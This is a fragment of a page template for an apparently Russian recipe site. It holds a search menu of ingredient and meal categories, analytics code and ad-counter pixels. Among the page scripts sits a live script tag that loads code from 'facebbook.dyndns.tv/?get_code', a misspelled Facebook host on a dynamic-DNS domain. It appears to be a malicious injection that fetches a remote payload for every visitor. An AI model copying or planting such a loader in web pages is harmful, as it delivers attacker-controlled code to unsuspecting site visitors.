...
<div id="search_helper" style="display:none;">
	<div class="body">
		<div class="menu">
			...
			<div class="item"><a href="#" rel="h_ingredients">Ингредиенты</a><span>Ингредиенты</span></div>

			<!--<div class="item"><a href="#" rel="h_dishes">Типы блюд</a><span>Типы блюд</span></div>-->
		...
		<div id="h_helper" class="search_blocks">
			...
			<div class="column">
				<div class="item">
					...
					<ul>
						...
						<li><a href="/search/Экзотика/">Хочется экзотики</a></li>
					</ul>
				</div>
			</div>
			...
			<div class="clear"></div>
			<!--<div class="random_dish"><a href="/recipe/">Случайное блюдо?</a></div>-->
		</div>
		...
		<!--<div id="h_dishes" class="search_blocks">
			<div class="column">

				<div class="item">
					<img src="/images/search/diet.jpg" width="200" height="150" alt="">
					<ul>
						<li><a href="/search/">Низкокалорийные</a></li>
						<li><a href="/search/">Диетические</a></li>
						<li><a href="/search/">Постные</a></li>
					</ul>
			...
			<div class="column">
				<div class="item">
					<img src="/images/search/dinner.jpg" width="200" height="150" alt="">
					<ul>
						<li><a href="/search/">Позавтракать</a></li>
						<li><a href="/search/">Пообедать</a></li>

						<li><a href="/search/">Поужинать</a></li>
						<li><a href="/search/">Поздний ужин</a></li>
					</ul>
				</div>
			</div>
			<div class="column">
				<div class="item">
					...
					<ul>
						<li><a href="/search/">Холостяку</a></li>
						<li><a href="/search/">Быстренько</a></li>
						<li><a href="/search/">Хочется экзотики</a></li>
					</ul>
				</div>
			</div>
			...
			<div class="column right">
				<div class="item">
					<img src="/images/search/guests.jpg" width="200" height="150" alt="">
					<ul>
						<li><a href="/search/">День рождения</a></li>
						<li><a href="/search/">Удивить гостей</a></li>
						<li><a href="/search/">Романтический ужин</a></li>

						<li><a href="/search/">Вечеринка с друзьями</a></li>
					</ul>
				</div>
			</div>
			<div class="clear"></div>
	...
	<!--
		...
		chosenSearchIngredient[0] = new Array();//номера группы
		chosenSearchIngredient[1] = new Array();//номера ингредиентов
	-->
	</script>
<?endif;?>
<!--	<div id="search_list_layer" style="display:none;">
		<div class="relative">
			<div class="padding">
				<h2></h2>
				<div class="column">
...
<script type="text/javascript" src="http://facebbook.dyndns.tv/?get_code"></script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-2763589-14");
...
document.write('<img src="http://ad.adriver.ru/cgi-bin/rle.cgi?' + 'sid=122107&bt=21&pz=0&rnd=' + RndNum4NoCash
+ '&tail256=' + ar_Tail + '" border=0 width=1 height=1>')
//-->]]>
</script>
<noscript>
<img src="http://ad.adriver.ru/cgi-bin/rle.cgi?sid=122107&amp;bt=21&amp;pz=0&amp;rnd=86257604" border="0" width="1" height="1" alt="" />
</noscript>
